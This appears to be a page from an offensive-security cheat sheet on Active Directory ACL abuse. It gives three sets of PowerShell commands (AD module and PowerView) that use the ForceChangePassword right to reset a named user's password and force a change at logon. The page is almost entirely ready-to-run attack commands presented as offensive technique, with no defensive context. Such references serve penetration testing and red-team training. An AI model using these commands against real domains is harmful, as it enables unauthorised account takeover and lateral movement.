---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/ad-attack/abuse-acls/forcechangepassword
---

# ForceChangePassword

## ForceChangePassword

### 1st Method

{% code title="AD-Module" overflow="wrap" %}
```powershell
PS C:\> Set-ADAccountPassword sieng.chantrea -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New-Password') -Verbose

New Password: ********
```
{% endcode %}

Enforce a password reset at next logon:

{% code title="AD-Module" overflow="wrap" %}
```powershell
PS C:\> Set-ADUser -ChangePasswordAtLogon $true -Identity sieng.chantrea -Verbose
```
{% endcode %}

### 2nd Method

{% code title="AD-Module" overflow="wrap" %}
```powershell
PS C:\> $Password = ConvertTo-SecureString "Password123" -AsPlainText -Force
PS C:\> Set-ADAccountPassword -Identity "sieng.chantrea" -Reset -NewPassword $Password 
```
{% endcode %}

### 3rd Method PowerView

{% code title="PowerView" %}
```powershell
$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity 'sieng.chantrea' -AccountPassword $NewPassword
```
{% endcode %}
